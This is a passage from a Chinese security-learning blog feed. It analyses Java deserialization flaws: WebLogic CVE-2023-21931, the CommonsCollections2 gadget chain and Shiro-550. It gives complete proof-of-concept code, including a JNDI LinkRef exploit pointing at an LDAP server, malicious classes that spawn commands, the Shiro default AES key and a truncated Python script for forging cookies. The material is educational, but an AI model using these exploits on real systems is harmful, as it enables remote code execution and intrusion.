alt="image-20230628170005065"></p><p>结合上面方框的代码其实可以发现，只要<code>this.jndiEnvironment</code>不为空，就可以对InitialContext进行初始化</p><p>现在要解决的问题是<code>remoteJNDIName</code>和<code>jndiEnvironment</code>要修改成怎样的值才能利用lookup()</p><p>目前能确定的是<code>remoteJNDIName=ldap://x.x.x.x:1389/aaaa</code></p><p>进入lookup,需要满足判断：满足一个条件就行</p><pre><code class="java">if (this.jndiEnvironment == null || !AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)) || this.remoteJNDIName == null || !this.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !this.remoteJNDIName.startsWith(AQJMS_TPREFIX)) &#123;                retVal = context.lookup(evalMacros(this.remoteJNDIName));&#125; </code></pre><p>由于前面<code>jndiEnvironment</code>和<code>remoteJNDIName</code>赋值了，<code>this.jndiEnvironment == null</code>和<code>this.remoteJNDIName == null</code>就不满足了</p><p><code>AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;))</code> 是对 <code>AQJMS_ICF</code> 和 <code>this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)</code> 进行比较。</p><p>其中<code>get(&quot;java.naming.factory.initial&quot;)</code> 方法获取到其属性 “java.naming.factory.initial” 对应的值,如果 <code>AQJMS_ICF</code> 和 <code>this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;)</code> 的值相等，那么比较结果将为 <code>true</code>；否则，比较结果将为 <code>false</code></p><p>后面的<code> !this.remoteJNDIName.startsWith(AQJMS_QPREFIX) &amp;&amp; !this.remoteJNDIName.startsWith(AQJMS_TPREFIX)</code>的意思是判断remoteJNDIName的开头</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628173243969.png" alt="image-20230628173243969"></p><p>根据POC,jndiEnvironment传入的是一个<code>Hashtable</code> 对象</p><pre><code class="java">Hashtable env2 = new Hashtable();env2.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</code></pre><p>在判断条件 <code>AQJMS_ICF.equals(this.jndiEnvironment.get(&quot;java.naming.factory.initial&quot;))</code> 中，this.jndiEnvironment.get(“java.naming.factory.initial”) 获取到的是 env2中存储的上下文工厂类com.sun.jndi.rmi.registry.RegistryContextFactory。</p><p>和AQJMS_ICF的值不相等，返回false,前面取“!”  ，变为true所以进入判断</p><p>POC代码似乎没有哪里是不懂的了，目前就先这样</p><h2 id="CVE-2023-21931"><a href="#CVE-2023-21931" class="headerlink" title="CVE-2023-21931"></a>CVE-2023-21931</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞的原理和上面的差不多，漏洞触发点在<code>WLNamingManager</code>类的 <code>getObjectInstance()</code>方法中：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628223712362.png" alt="image-20230628223712362"></p><p>可以看到当传入的 <code>boundObject</code> 对象是 <code>LinkRef</code> 的实现类时，则调用传入对象 <code>boundObject </code> 的 <code>getLinkName()</code> 方法，并通过<code>lookup()</code> 方法对 <code>getLinkName()</code> 方法返回的 <code>linkAddrType</code> 地址进行远程JNDI加载</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628223927784.png" alt="image-20230628223927784"></p><p>漏洞JNDI地址构造在<code>LinkRef</code>这个类中，<code>LinkRef</code>是Java的一个原生类。通过<code>LinkRef</code>类中的构造方法，我们可以控制变量<code>linkAddrType</code>的值， 再通过<code>getLinkName()</code>方法将<code>linkAddrType</code>作为字符串返回。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230628224853045.png" alt="image-20230628224853045"></p><p>到这里还有一个疑问，怎样才能调用<code>getObjectInstance()</code>方法？</p><p>参考<a href="https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_zh_CN.md">https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_zh_CN.md</a></p><p>查看t3的lookup()方法的调用栈：</p><ul><li>Weblogic在接收到请求后，通过<code>BasicServerRef</code>类中的<code>invoke()</code>方法解析传入数据。</li><li>通过<code>_invoke()</code>方法，Weblogic根据传入的方法名<code>resolve_any</code> 执行的<code>resolve_any()</code>方法。</li><li>在<code>resolve_any()</code>方法中，通过<code>resolveObject()</code>方法对传入的绑定命名进行解析。</li><li>在<code>resolveObject()</code>方法中，根据上下文信息调用其中的<code>lookup()</code>方法。</li><li>根据上下文中的信息，经过在<code>WLContextImpl</code>、<code>WLEventContextImpl</code>、 <code>WLEventContextImpl</code> 、<code>RootNamingNode  </code>、<code>ServerNamingNode</code> 、<code>BasicNamingNode</code>类中一系列的<code>lookup()</code>方法调用，实现<code>BasicNamingNode</code>类中的<code>resolveObject()</code>方法调用。</li><li>由于传入<code>resolveObject()</code>方法中的obj不是<code>NamingNode</code>类的实例，且<code>mode</code>的值默认为1，所以会调用<code>WLNamingManager</code>类中的<code>getObjectInstance()</code>方法。</li></ul><p>最终，可以看到<code>WLNamingManager</code>类的<code>getObjectInstance()</code>方法根据传入的对象接口类型，调用对象中的<code>getReferent()</code>方法，完成漏洞触发点的<code>lookup()</code>方法调用。实际上这两个CVE漏洞都是通过<code>getObjectInstance()</code>的两个分支触发的。</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.LinkRef;import java.util.Hashtable;//import weblogic.jndi.internal.WLNamingManager;public class exp &#123;    public static void main(String[] agrs) throws Exception &#123;        String url = &quot;t3://192.168.79.133:7001&quot;;        String JNDI_FACTORY = &quot;weblogic.jndi.WLInitialContextFactory&quot;;        Hashtable ht = new Hashtable();        ht.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);        ht.put(Context.PROVIDER_URL, url); // 目标        InitialContext c = new InitialContext(ht);        LinkRef LR = new LinkRef(&quot;ldap://192.168.10.14:1389/Basic/Command/whoami&quot;);        c.rebind(&quot;poc&quot;, LR);        c.lookup(&quot;poc&quot;);    &#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections2</title>
      <link href="/2023/06/23/CommonsCollections2/"/>
      <url>/2023/06/23/CommonsCollections2/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很久没学习了，对java的反序列化的知识很陌生，学习一下CC2，打好基础 ,篇幅不多贵在记录</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>CC2使用的是<code>javassist</code>和<code>PriorityQueue</code>来构造利用链；<br>并且使用的是<code>commons-collections-4.0</code>版本，而3.1-3.2.1版本中<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本</p><ul><li>java 1.8_111</li><li>commons-collections4</li></ul><p>在maven项目中的pom文件中添加下面两个依赖</p><pre><code>&lt;dependency&gt;      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;      &lt;version&gt;4.0&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.javassist&lt;/groupId&gt;      &lt;artifactId&gt;javassist&lt;/artifactId&gt;      &lt;version&gt;3.22.0-GA&lt;/version&gt;    &lt;/dependency&gt;</code></pre><h2 id="字节码编程"><a href="#字节码编程" class="headerlink" title="字节码编程"></a>字节码编程</h2><p>简单认识一下字节码编程：</p><p>字节码编程与反射有一点类似，但是要比反射机制更加强大。</p><p>在反射机制中，可以动态加载类、创建对象，获得类的方法和属性。反射机制是在一个已经被创建好的类上进行操作。然而在字节码编程中，我们不仅可以动态的加载类，还可以依据我们的需求，在程序的运行过程中，创建一个新的类，也可以给修改或添加任何一个类的方法和属性。</p><p><a href="https://songly.blog.csdn.net/article/details/118944928">参考</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先编写一个恶意类：</p><pre><code>package org.example;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Evi extends AbstractTranslet&#123;    public  Evi() &#123;        super();        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;</code></pre><p>这里留个疑问，为什么恶意类要继承<code>AbstractTranslet</code> </p><p>根据网上先辈们的分析，主要利用了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类</p><p>这个类中存在一个<code>defineTransletClasses</code>方法，loader.defineClass()方法返回的值存储在_class中，参数<code>_bytecodes</code>是一个字节码</p><p>大概是将<code>_bytecodes</code>中存储的恶意字节码转换为Class对象，并存入_class属性中</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623181252085.png" alt="image-20230623181252085"></p><p>存储了有啥用呢？如果这个字节码是恶意的字节码，也需要加载才能利用啊</p><p>继续看<code>TemplatesImpl</code>类的另外一个方法<code>getTransletInstance</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623182540379.png" alt="image-20230623182540379"></p><p>这个方法中调用了刚刚的<code>defineTransletClasses</code>方法，把字节码转换为Class对象，并存入_class属性中</p><p>然后调用了<code>newInstance</code>加载Class对象</p><p>思路到这里就可以先构造一下POC</p><p>先把开始构造的恶意类转换成字节码</p><pre><code class="java">ClassPool classPool = ClassPool.getDefault();CtClass ctClass = classPool.getCtClass(&quot;org.example.Evi&quot;);byte[] bytes = ctClass.toBytecode();</code></pre><p>通过反射给私有属性<code>_bytecodes</code>赋值</p><pre><code class="java">Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);//获取私有的有参构造方法Object TemplatesImpl_instance = constructor.newInstance();//将恶意类的字节码设置给_bytecodes属性Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);bytecodes.set(TemplatesImpl_instance, new byte[][]&#123;bytes&#125;);</code></pre><p>在<code>getTransletInstance()</code>中，如果<code>_name</code>为空就<code>return</code>结束了，如下图</p><p>所以还要给<code>_name</code>赋值,这里赋值随便</p><pre><code class="java">Field name = aClass.getDeclaredField(&quot;_name&quot;);name.setAccessible(true);name.set(TemplatesImpl_instance, &quot;Evi&quot;);</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623220242028.png" alt="image-20230623220242028"></p><p>到这里，看看有什么方法能够调用<code>getTransletInstance()</code>,因为这个是个私有的方法，要是能够找到一个<code>public</code>的方法调用它就好了</p><p>在同一个类里边找到了<code>newTransformer()</code>方法，符合要求</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623221024999.png" alt="image-20230623221024999"></p><p>现在要解决的是怎么调用这个方法</p><p>我尝试使用反射的方法调用，但是不知道出了什么问题，用不了，先在这里留个坑，整明白再补,代码如下：</p><pre><code class="java">// 调用newTransformer()方法Method newTransformerMethod = aClass.getMethod(&quot;newTransformer&quot;);newTransformerMethod.setAccessible(true);Transformer transformer = (Transformer) newTransformerMethod.invoke(TemplatesImpl_instance);</code></pre><p>另寻出路</p><p><code>newTransformer()</code>方法返回的是<code>transformer</code>,这个很难不让人想起CC1中的transformer数组，</p><p><code>InvokerTransformer</code>类中有一个<code>transform</code>方法会根据传入的<code>iMethodName</code>，<code>iParamTypes</code>，<code>iArgs</code>这三个成员属性来执行class对象的某个方法，并且这三个属性是根据InvokerTransformer类的构造传入的，然后通过<code>InvokerTransformer</code>类的<code>transform</code>方法来调用<code>newTransformer</code>方法。</p><p>自己的想法(想直接用transform，但是没成功，第二个坑)：</p><pre><code>new InvokerTransformer(&quot;newTransformer&quot;, null, null).transform(TemplatesImpl_instance);</code></pre><p>网上先辈的：使用<code>TransformingComparator</code>来调用<code>transform</code></p><pre><code class="java">InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);TransformingComparator transformer_comparator = new TransformingComparator(transformer);</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623231301740.png" alt="image-20230623231301740"></p><p><code>TransformingComparator</code>类是一个<code>Comparable </code>对象的<code>comparator</code>比较器，实现了<code>Serializable</code>接口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623231607770.png" alt="image-20230623231607770"></p><p><code>TransformingComparator</code>类的compare方法中通过transformer属性来调用transform方法的，如果想要调用InvokerTransformer类的transform方法，可以把InvokerTransformer传给TransformingComparator类的构造来设置transformer属性</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230623231840514.png" alt="image-20230623231840514"></p><p>所以才有了上面的：</p><pre><code class="java">InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);TransformingComparator transformer_comparator = new TransformingComparator(transformer);</code></pre><p>下一步：如何调用<code>TransformingComparator</code>的<code>compare</code>方法？</p><p>根据POC 这里使用的是PriorityQueue集合，PriorityQueue是一个优先队列，每次排序都会触发comparator比较器的compare方法，并且PriorityQueue还重写了readObject方法（反序列化漏洞必要的利用条件）。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624152437651.png" alt="image-20230624152437651"></p><p>这里使用了<code>heapify()</code>方法，该方法里面调用了siftDown()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624152601658.png" alt="image-20230624152601658"></p><p>查看siftDown():</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624152721157.png" alt="image-20230624152721157"></p><p>其中<code>siftDownUsingComparator</code>方法里存在我们想要的<code>compare</code>方法，并且参数可控</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624152823718.png" alt="image-20230624152823718"></p><p>后面的有点看不懂了，参考先辈的原话：</p><p>从siftDown方法中可以看出PriorityQueue队列中的comparator属性是一个比较器并且还是可控的，如果comparator属性指定为TransformingComparator比较器的话，不就可以调用TransformingComparator的compare方法了吗，于是万能的反射再次登场了，通过反射将PriorityQueue队列中的comparator属性设置为TransformingComparator比较器，这样PriorityQueue集合在反序列化过程中就会调用comparator比较器了，不得不说PriorityQueue集合完美的符合我们需要构造的利用链。</p><pre><code class="java"> //触发漏洞PriorityQueue queue = new PriorityQueue(2);queue.add(1);queue.add(1);//设置comparator属性Field field = queue.getClass().getDeclaredField(&quot;comparator&quot;);field.setAccessible(true);field.set(queue, transformer_comparator);//设置queue属性field = queue.getClass().getDeclaredField(&quot;queue&quot;);field.setAccessible(true);//队列至少需要2个元素Object[] objects = new Object[]&#123;TemplatesImpl_instance, TemplatesImpl_instance&#125;;field.set(queue, objects);</code></pre><p>然后就是序列化和反序列化：</p><pre><code class="java">ByteArrayOutputStream barr = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(barr);oos.writeObject(queue);oos.close();ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));Object object = ois.readObject();</code></pre><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230624154542498.png" alt="image-20230624154542498"></p><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><pre><code class="java">package org.example;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class App &#123;    public static void main(String[] args) throws Exception &#123;        //构造恶意类TestTemplatesImpl并转换为字节码        ClassPool classPool = ClassPool.getDefault();        CtClass ctClass = classPool.getCtClass(&quot;org.example.Evi&quot;);        byte[] bytes = ctClass.toBytecode();        //反射创建TemplatesImpl        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);        Object TemplatesImpl_instance = constructor.newInstance();        //将恶意类的字节码设置给_bytecodes属性        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(TemplatesImpl_instance, new byte[][]&#123;bytes&#125;);        //设置属性_name为恶意类名        Field name = aClass.getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        name.set(TemplatesImpl_instance, &quot;Evi&quot;);        //构造利用链        InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);        TransformingComparator transformer_comparator = new TransformingComparator(transformer);        //触发漏洞        PriorityQueue queue = new PriorityQueue(2);        queue.add(1);        queue.add(1);        //设置comparator属性        Field field = queue.getClass().getDeclaredField(&quot;comparator&quot;);        field.setAccessible(true);        field.set(queue, transformer_comparator);        //设置queue属性        field = queue.getClass().getDeclaredField(&quot;queue&quot;);        field.setAccessible(true);        //队列至少需要2个元素        Object[] objects = new Object[]&#123;TemplatesImpl_instance, TemplatesImpl_instance&#125;;        field.set(queue, objects);        //序列化 ---&gt; 反序列化        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(queue);        oos.close();        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        Object object = ois.readObject();    &#125;&#125;</code></pre><p>恶意类：</p><pre><code class="java">package org.example;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Evi extends AbstractTranslet&#123;    public  Evi() &#123;        super();        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;</code></pre><h2 id="另外一种思路"><a href="#另外一种思路" class="headerlink" title="另外一种思路"></a>另外一种思路</h2><p>先上POC ，这个是Y4tacker大佬写的，学习一下</p><pre><code class="java">package org.example;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.Comparator;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;public class App &#123;    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj, value);    &#125;    public static void main(String[] args) throws Exception &#123;        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,                        new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,                        new String[] &#123; &quot;calc.exe&quot; &#125;),        &#125;;        Transformer transformerChain = new ChainedTransformer(fakeTransformers);        Comparator comparator = new TransformingComparator(transformerChain);        PriorityQueue queue = new PriorityQueue(2, comparator);        queue.add(1);        queue.add(2);        setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(queue);        oos.close();        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        Object o = (Object)ois.readObject();    &#125;&#125;</code></pre><p>他没有使用<code>javassist</code>将恶意的类转为字节码加载，而是直接使用CC6中使用到的<code>ChainedTransformer</code>获取恶意代码</p><pre><code class="java">public static void main(String[] args) throws Exception &#123;        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,                        new Class[0] &#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,                        new String[] &#123; &quot;calc.exe&quot; &#125;),        &#125;;        Transformer transformerChain = new ChainedTransformer(fakeTransformers);        Comparator comparator = new TransformingComparator(transformerChain);</code></pre><p>然后后面的基本思路都差不多</p><p>详细的可以参考他的<a href="https://github.com/Y4tacker/JavaSec/blob/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/CommonsCollections2/CommonsCollections2.md">分析</a>  </p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro反序列化漏洞</title>
      <link href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><code>Apache Shiro</code>是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>Shiro反序列化漏洞Shiro-550<code>(Apache  Shiro &lt; 1.2.5)</code><strong>和Shiro-721</strong><code>( Apache  Shiro &lt; 1.4.2 )</code><strong>。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用</strong><code>登录后rememberMe=&#123;value&#125;去爆破正确的key值</code><strong>进而反序列化，对比Shiro550条件只要有</strong><code>足够密钥库</code><strong>（条件比较低）、Shiro721需要登录（要求比较高</strong><del><strong>鸡肋</strong></del>）。</p><ul><li><code>Apache Shiro &lt; 1.4.2</code><strong>默认使用</strong><code>AES/CBC/PKCS5Padding</code><strong>模式</strong></li><li><code>Apache Shiro &gt;= 1.4.2</code><strong>默认使用</strong><code>AES/GCM/PKCS5Padding</code><strong>模式</strong></li></ul><h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Apache Shiro&lt; &#x3D;1.2.4提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。<br>那么，Payload产生的过程：<br>命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;伪造RememberMe Cookie值</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我是按照这个搭建的</p><p><a href="https://blog.csdn.net/qq_44769520/article/details/123476443">https://blog.csdn.net/qq_44769520/article/details/123476443</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个漏洞点出在这里</p><pre><code class="java">public T deserialize(byte[] serialized) throws SerializationException &#123;    if (serialized == null) &#123;        String msg = &quot;argument cannot be null.&quot;;        throw new IllegalArgumentException(msg);    &#125;    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);    BufferedInputStream bis = new BufferedInputStream(bais);    try &#123;        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);        @SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)        T deserialized = (T) ois.readObject();        ois.close();        return deserialized;    &#125; catch (Exception e) &#123;        String msg = &quot;Unable to deserialze argument byte array.&quot;;        throw new SerializationException(msg, e);    &#125;&#125;</code></pre><p>这个是实现反序列化的函数，重点在<code>T deserialized = (T) ois.readObject();</code> </p><p>若能够控制输入的参数<code>serialized</code>，<code>URLDNS</code>这条链就可以实现，既检测出反序列化漏洞</p><p>Alt+F7查找用法<code>deserialize</code>,找到下面两个方法</p><pre><code class="java">protected byte[] serialize(PrincipalCollection principals) &#123;    return getSerializer().serialize(principals);&#125;/** * De-serializes the given byte array by using the &#123;@link #getSerializer() serializer&#125;&#39;s * &#123;@link Serializer#deserialize deserialize&#125; method. * * @param serializedIdentity the previously serialized &#123;@code PrincipalCollection&#125; as a byte array * @return the de-serialized (reconstituted) &#123;@code PrincipalCollection&#125; */protected PrincipalCollection deserialize(byte[] serializedIdentity) &#123;    return getSerializer().deserialize(serializedIdentity);&#125;</code></pre><p>这两个方法一个是进行序列化的，一个是进行反序列化的</p><p>毕竟是逆向分析，选择<code>deserialize</code>往前跟进,在<code>AbstractRememberMeManager.java</code>找到以下方法</p><pre><code class="java">protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123;    if (getCipherService() != null) &#123;        bytes = decrypt(bytes);    &#125;    return deserialize(bytes);&#125;</code></pre><p>可以看到就进行了两个操作 <code>decrypt</code> 和 <code>deserialize</code>，一个是解密，一个是反序列化</p><p>查看<code>decrypt</code></p><pre><code class="java">protected byte[] decrypt(byte[] encrypted) &#123;    byte[] serialized = encrypted;    CipherService cipherService = getCipherService();    if (cipherService != null) &#123;        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());        serialized = byteSource.getBytes();    &#125;    return serialized;&#125;</code></pre><p>这里的解密是AES解密，需要一个KEY</p><p>一步步跟踪，找到了这个版本的key<code>kPH+bIxk5D2deZiIxcaaaA==</code></p><pre><code class="java">private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);</code></pre><p>下一步跟踪到这</p><pre><code class="java">protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;    if (!WebUtils.isHttp(subjectContext)) &#123;        if (log.isDebugEnabled()) &#123;            String msg = &quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot; +                    &quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot; +                    &quot;immediately and ignoring rememberMe operation.&quot;;            log.debug(msg);        &#125;        return null;    &#125;    WebSubjectContext wsc = (WebSubjectContext) subjectContext;    if (isIdentityRemoved(wsc)) &#123;        return null;    &#125;    HttpServletRequest request = WebUtils.getHttpRequest(wsc);    HttpServletResponse response = WebUtils.getHttpResponse(wsc);    String base64 = getCookie().readValue(request, response);    // Browsers do not always remove cookies immediately (SHIRO-183)    // ignore cookies that are scheduled for removal    if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;    if (base64 != null) &#123;        base64 = ensurePadding(base64);        if (log.isTraceEnabled()) &#123;            log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;);        &#125;        byte[] decoded = Base64.decode(base64);        if (log.isTraceEnabled()) &#123;            log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded != null ? decoded.length : 0) + &quot; bytes.&quot;);        &#125;        return decoded;    &#125; else &#123;        //no cookie set - new site visitor?        return null;    &#125;&#125;</code></pre><p>这里的逻辑是先获取cookie中rememberMe的值，然后判断是否是deleteMe，不是则判断是否是符合base64的编码长度，然后再对其进行base64解码，将解码结果返回。</p><p>整个解密过程就结束了，虽然是往前跟踪，但是还是可以清楚的知道解密过程都是围绕Cookie中的<code>rememberMe</code>进行的，如果我们能构造<code>rememberMe</code>,就能执行命令了</p><p>查看依赖</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304161707095.png" alt="image-20230411222937180"></p><p>如果要执行命令，这里有两条链可以用，<code>CommonsCollections11</code>和<code>CommonsBeanutils1_183</code></p><p>使用<a href="https://github.com/KpLi0rn/ysoserial%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97poc%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E6%AF%94%E5%8E%9F%E7%89%88%E7%9A%84ysoserial%E5%A4%9A%E4%BA%86CommonsBeanutils1_183%E8%BF%99%E6%9D%A1%E9%93%BE">https://github.com/KpLi0rn/ysoserial这个工具即可获得poc，该工具比原版的ysoserial多了CommonsBeanutils1_183这条链</a></p><p>到这还不行，还要对poc进行加密，按照刚刚分析的，先对poc进行AES加密，然后再进行Base64加密</p><p>python exp</p><pre><code class="python">import sysimport base64import uuidfrom random import Randomimport subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = 